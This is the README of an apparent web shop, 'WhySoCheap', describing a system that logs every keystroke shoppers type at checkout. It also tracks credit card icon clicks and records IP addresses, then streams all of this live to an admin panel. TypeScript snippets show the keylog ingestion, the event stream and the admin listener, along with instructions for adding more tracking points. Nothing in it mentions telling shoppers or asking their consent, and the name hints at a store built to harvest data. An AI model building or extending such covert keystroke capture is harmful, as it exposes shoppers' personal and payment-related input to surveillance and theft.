# 🗄️ WhySoCheap - Real-time Database & Keylogging System

## ✅ **Database System Implemented**

### 📊 **In-Memory Database with Real-time Updates**
- **Live Data Storage**: All data stored in memory for fast access
- **Real-time Keylogging**: Every keystroke logged and broadcast instantly
- **Server-Sent Events**: Admin panel updates in real-time via SSE
- **Persistent Storage**: Manual save to JSON file via admin panel

### 🔄 **Real-time Features**
- **Live Keylog Updates**: Admin panel shows keylogs as they happen
- **Customer Data Tracking**: Real-time customer information updates
- **Order Management**: Live order status updates
- **Product Management**: Real-time product CRUD operations

## 🏗️ **Technical Architecture**

### Database Service (`src/lib/database.ts`)
```typescript
// In-memory storage with real-time events
class DatabaseService {
  private products: DatabaseProduct[] = []
  private orders: DatabaseOrder[] = []
  private customers: DatabaseCustomer[] = []
  private keylogs: KeylogEntry[] = []
  private feedbacks: CustomerFeedback[] = []
  
  // Real-time keylogging
  public logKeypress(customerEmail, field, value, ipAddress, userAgent) {
    const keylog = { id, customerEmail, field, value, timestamp, ipAddress, userAgent }
    this.keylogs.push(keylog)
    this.updateCustomerData(customerEmail, field, value)
    realtimeBus.emit('keylog', keylog) // Broadcast to admin
    return keylog
  }
}
```

### Real-time Stream (`src/app/api/keylog/stream/route.ts`)
```typescript
// Server-Sent Events for live updates
export async function GET() {
  const stream = new ReadableStream({
    start(controller) {
      const onKeylog = (keylog) => {
        const payload = `event: keylog\ndata: ${JSON.stringify(keylog)}\n\n`
        controller.enqueue(encoder.encode(payload))
      }
      realtimeBus.on('keylog', onKeylog)
      // ... cleanup
    }
  })
  return new Response(stream, { headers: { 'Content-Type': 'text/event-stream' } })
}
```

### Admin Live Updates (`src/app/admin/page.tsx`)
```typescript
// Real-time keylog updates in admin panel
useEffect(() => {
  const es = new EventSource('/api/keylog/stream')
  const onKeylog = (event) => {
    const data = JSON.parse(event.data)
    setKeylogs(prev => [data, ...prev].slice(0, 500))
  }
  es.addEventListener('keylog', onKeylog)
  return () => es.close()
}, [])
```

## 📁 **Where to Edit Keylogging & Database**

### 1. **Keylog Ingestion** (`src/app/api/keylog/route.ts`)
- **What it does**: Receives keylog data from frontend
- **Edit here**: Change validation, add new fields, modify response format
- **Key functions**: `POST` handler for logging, `GET` handler for retrieval

### 2. **Database Logic** (`src/lib/database.ts`)
- **What it does**: Core database operations and real-time events
- **Edit here**: Modify data structure, add new operations, change persistence
- **Key functions**: `logKeypress()`, `updateCustomerData()`, CRUD operations

### 3. **Real-time Stream** (`src/app/api/keylog/stream/route.ts`)
- **What it does**: Broadcasts keylog events to admin panel
- **Edit here**: Change event format, add filtering, modify SSE behavior
- **Key functions**: `GET` handler for SSE stream

### 4. **Admin Panel** (`src/app/admin/page.tsx`)
- **What it does**: Displays and manages all data
- **Edit here**: Change UI, add new features, modify data display
- **Key functions**: Live updates, CRUD operations, data visualization

### 5. **Frontend Logging** (`src/app/checkout/page.tsx`)
- **What it does**: Sends keylog data from user inputs
- **Edit here**: Change what gets logged, add new tracking points
- **Key functions**: `logKeypress()`, `logCardClick()`

## 🎯 **Key Features**

### Real-time Keylogging
- **Every keystroke** in shipping inputs is logged
- **Credit card icon clicks** are tracked
- **IP address and user agent** are recorded
- **Customer data** is updated in real-time

### Admin Panel Features
- **Live Updates**: Keylogs appear instantly in admin panel
- **Data Management**: Full CRUD for products, orders, customers
- **Analytics**: Revenue, orders, customers, keylog statistics
- **Save Database**: Manual save to JSON file

### Data Persistence
- **In-Memory Storage**: Fast access during session
- **Manual Save**: Admin can save to `data/db.json`
- **Export/Import**: API endpoints for data backup

## 📊 **Data Structure**

### KeylogEntry
```typescript
{
  id: string
  customerEmail: string
  field: string          // 'firstName', 'lastName', 'address', etc.
  value: string         // The actual input value
  timestamp: Date
  ipAddress: string
  userAgent: string
}
```

### DatabaseCustomer
```typescript
{
  id: string
  email: string
  firstName: string
  lastName: string
  phone: string
  address: string
  city: string
  state: string
  zipCode: string
  country: string
  totalOrders: number
  totalSpent: number
  createdAt: Date
  updatedAt: Date
}
```

## 🚀 **How to Use**

### 1. **View Real-time Keylogs**
- Go to Admin Panel → Keylogs tab
- Watch keylogs appear in real-time as users type
- See customer behavior and input patterns

### 2. **Manage Data**
- **Products**: Add, edit, delete products
- **Orders**: Update order status, view order details
- **Customers**: View customer profiles and analytics
- **Keylogs**: Monitor user input behavior

### 3. **Save Database**
- Click "Save Database" button in admin panel
- Data is saved to `data/db.json` file
- Survives server restarts (when loaded)

### 4. **Export Data**
- Use `GET /api/database` to export all data
- Use `POST /api/database` to save current state

## 🔧 **Customization**

### Add New Keylog Fields
1. Update `KeylogEntry` interface in `src/lib/database.ts`
2. Modify `logKeypress()` function to handle new fields
3. Update admin panel to display new fields

### Change Keylog Behavior
1. Edit `src/app/checkout/page.tsx` to log different events
2. Modify `src/app/api/keylog/route.ts` for validation
3. Update admin panel UI in `src/app/admin/page.tsx`

### Add New Data Types
1. Create new interface in `src/lib/database.ts`
2. Add CRUD methods to `DatabaseService`
3. Create API routes for new data type
4. Update admin panel to manage new data

## 📈 **Analytics Available**

### Real-time Metrics
- **Total Keylogs**: Number of logged keystrokes
- **Active Customers**: Customers with recent activity
- **Input Patterns**: Most common fields being filled
- **Geographic Data**: IP-based location tracking

### Customer Insights
- **Input Behavior**: How customers fill forms
- **Field Completion**: Which fields are most/least used
- **Session Tracking**: Customer journey through checkout
- **Device Information**: User agent analysis

## 🎉 **Complete System**

The WhySoCheap now has:
- ✅ **Real-time Database** with in-memory storage
- ✅ **Live Keylogging** with instant admin updates
- ✅ **Customer Tracking** with real-time data updates
- ✅ **Admin Management** with full CRUD operations
- ✅ **Data Persistence** with manual save functionality
- ✅ **Analytics Dashboard** with live metrics
- ✅ **Export/Import** capabilities for data backup

The system provides complete real-time monitoring of user behavior, customer data management, and comprehensive admin tools for store management.
